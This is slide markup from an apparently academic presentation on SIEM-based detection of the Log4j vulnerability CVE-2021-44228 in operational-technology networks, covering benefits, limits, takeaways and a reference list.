          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A97A8"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Recording:  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EEF3FA"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Zoom — camera on, student ID shown — link inserted with submission</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01826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HONEST APPRAISAL</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>What the SIEM gives us — and its limits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2011680"/>
            <a:ext cx="5349240" cy="3566160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2308"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2011680"/>
            <a:ext cx="5349240" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 41667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2E6FD6"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="2286000"/>
            <a:ext cx="4663440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Benefits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="2971800"/>
            <a:ext cx="4709160" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cross-source correlation single tools can't do</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Lower MTTD/MTTR; retrospective threat hunting</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Threat-intel enrichment (KEV, ProductCERT)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Audit trail for NIST 800-61r3 &amp; Essential Eight</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2011680"/>
            <a:ext cx="5349240" cy="3566160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2308"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="16233A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="2011680"/>
            <a:ext cx="5349240" cy="109728"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 41667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="C87A1E"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2286000"/>
            <a:ext cx="4663440" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E8B368"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Limits — and our mitigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2971800"/>
            <a:ext cx="4709160" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Sees only what's ingested → onboarding checklist</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Signature noise → risk-based &amp; correlated rules</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Encryption/evasion → behavioural detections</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="203200" indent="-203200">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C4D4"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>No agents on OT → passive sensor feed</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8FB"/>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1C5CAB"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>IN SUMMARY</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3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Three things to take away</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="11094415" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="2286000"/>
            <a:ext cx="1097280" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="2167128"/>
            <a:ext cx="9326880" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>10.0, but not everywhere equally</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="2624328"/>
            <a:ext cx="9418320" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A maximal base score; environmental scoring (9.5→8.0) is how we sequence the fix across OT.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3337560"/>
            <a:ext cx="11094415" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="3657600"/>
            <a:ext cx="1097280" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2E6FD6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="3538728"/>
            <a:ext cx="9326880" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Patching alone was never enough</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="3995928"/>
            <a:ext cx="9418320" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>A family of CVEs, buried in the supply chain and in OT firmware — detection has to run alongside remediation.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4709160"/>
            <a:ext cx="11094415" cy="1234440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="DDE3EC"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="868680" y="5029200"/>
            <a:ext cx="1097280" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D14343"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="4910328"/>
            <a:ext cx="9326880" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B2430"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>The SIEM turns three weak signals into one</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2194560" y="5367528"/>
            <a:ext cx="9418320" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="47515F"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Right inputs, correlated insights, safety-gated actions — we see an attempt before it becomes a grid incident.</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01826"/>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7FA8E6"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>REFERENCES (IEEE)</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2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Selected sources</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="5394960" cy="3840480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>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1. MITRE, “CVE-2021-44228,” CVE.org.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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2. NIST, NVD “CVE-2021-44228 Detail.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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3. Apache SF, “Log4j Security Vulnerabilities.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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4. FIRST, “CVSS v3.1 Specification.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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5. FIRST, “CVSS v4.0 Specification.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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6. Mell, Scarfone, Romanosky, “CVSS v2.0 Guide,” 2007.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>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7. CISA, “Apache Log4j Vulnerability Guidance.”</a:t>
